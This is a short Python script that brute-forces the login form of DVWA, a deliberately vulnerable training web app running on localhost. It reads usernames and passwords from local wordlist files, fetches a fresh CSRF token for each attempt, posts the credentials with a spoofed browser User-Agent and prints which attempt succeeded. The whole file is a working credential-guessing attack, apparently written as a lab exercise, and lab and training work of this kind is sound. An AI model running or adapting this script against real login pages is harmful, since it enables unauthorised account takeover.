import datetime
import requests
from bs4 import BeautifulSoup


def brute_force(username, password):
    url = "http://127.0.0.1/dvwa/login.php"
    s = requests.Session()
    req = s.get(url)
    heads = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'}
    req.encoding = 'UTF-8'
    html = req.text
    soup_texts = BeautifulSoup(html, 'html.parser')
    csrf_token = soup_texts.find('input', {'name': 'user_token'}).get('value')
    data = {'username': username, 'password': password, 'Login': 'Login', 'user_token': csrf_token}
    req = s.post(url=url, headers=heads, data=data)
    req.encoding = 'UTF-8'
    html = req.text
    if 'Login failed' in html:
        print("[-]------Attempting username %s, password %s, login failed" % (username, password))
    else:
        print('[+]------Attempting username %s, password %s, login success' % (username, password))
        exit()


def open_dic():
    with open(r"C:\Users\29162\Desktop\admin.txt") as List_user:
        for Users in List_user.readlines():
            with open(r"C:\Users\29162\Desktop\password.txt") as List_pass:
                for Passes in List_pass.readlines():
                    brute_force(Users.strip(), Passes.strip())


if __name__ == '__main__':
    print('[+]--------------------------start brute force------------------------------')
    open_dic()